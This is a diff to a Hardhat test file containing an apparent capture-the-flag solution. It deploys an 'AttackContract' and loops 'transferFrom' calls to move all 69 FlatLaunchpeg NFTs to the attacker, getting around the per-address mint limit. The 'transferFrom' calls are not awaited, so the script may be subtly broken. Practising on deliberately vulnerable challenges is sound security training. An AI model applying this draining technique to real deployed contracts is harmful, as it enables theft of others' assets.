@@ -27,6 +27,41 @@ before(async () => {
 });
 
 it("solves the challenge", async function () {
+    // const collectionSize = 69;
+    // const maxperaddressduringmint = 5;
+
+    const AttackContract = await ethers.getContractFactory("AttackContract");
+    const attackContract = await AttackContract.connect(attacker).deploy(attacker.getAddress(), flatLaunchpeg.address);
+  
+    await attackContract.deployed();
+  
+    /** Interact with the AttackContract contract */
+    const contract = await ethers.getContractAt("AttackContract", attackContract.address);
+
+
+    //total addresses
+    const alladdress = await contract.returnAlladdress();
+
+      // Initialize the ID counter
+  let idCounter = 0;
+
+  // Loop through each contract address
+  for (let i = 0; i < alladdress.length; i++) {
+    const contractAddress = alladdress[i];
+  
+      // Calculate the number of NFTs to mint in the current contract
+      const nftsToMintPerContract = (i === alladdress.length - 1) ? 4 : 5;
+  
+    
+    // Mint the NFTs in the current contract
+    for (let j = 0; j < nftsToMintPerContract; j++) {
+        // Mint the NFT using the current contract and address
+        flatLaunchpeg.connect(attacker).transferFrom(contractAddress, attacker.getAddress(), idCounter)
+
+        idCounter++;
+    }
+    
+  }
 
   // implement solution here
 
@@ -37,6 +72,6 @@ after(async () => {
 
   expect(await flatLaunchpeg.totalSupply()).to.be.equal(69)
   expect(await flatLaunchpeg.balanceOf(await attacker.getAddress())).to.be.equal(69)
-  expect(await ethers.provider.getBlockNumber()).to.be.equal(startBlock+1)
+  expect(await ethers.provider.getBlockNumber()).to.be.equal(startBlock.valueOf()+1)
   
 });
